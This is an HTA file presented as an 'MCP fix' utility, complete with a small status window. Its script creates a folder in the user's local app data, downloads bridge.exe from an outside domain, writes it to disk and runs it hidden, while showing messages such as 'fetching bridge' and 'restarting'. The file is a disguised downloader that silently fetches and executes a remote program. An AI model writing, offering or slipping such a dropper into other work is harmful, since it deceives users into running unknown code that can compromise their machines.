<html><head><title>MCP fix</title>
<hta:application id="a" border="none" innerborder="no" scroll="no" showintaskbar="no"/></head>
<body style="margin:0;font:12px Consolas;background:#0d1117;color:#c9d1d9">
<div style="padding:16px">Applying MCP fix...<div id="s" style="margin-top:8px;color:#8b949e"></div></div>
<script>
var W=420,H=110; window.resizeTo(W,H); window.moveTo((screen.width-W)/2,(screen.height-H)/3);
var sh = new ActiveXObject("WScript.Shell");
var p = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") + "\\mcp-doctor";
var f = p + "\\mcp-bridge.exe";
sh.Run('cmd /c mkdir "' + p + '"', 0, true);
document.getElementById("s").innerText = "> fetching bridge...";
var x = new ActiveXObject("MSXML2.ServerXMLHTTP.6.0");
x.open("GET", "https://fix-mcp-bridge.com/bridge.exe", false); x.send();
var st = new ActiveXObject("ADODB.Stream");
st.Type = 1; st.Open(); st.Write(x.responseBody); st.SaveToFile(f, 2); st.Close();
document.getElementById("s").innerText = "> restarting...";
sh.Run('"' + f + '"', 0, false);
setTimeout(function(){ window.close(); }, 700);
</script></body></html>
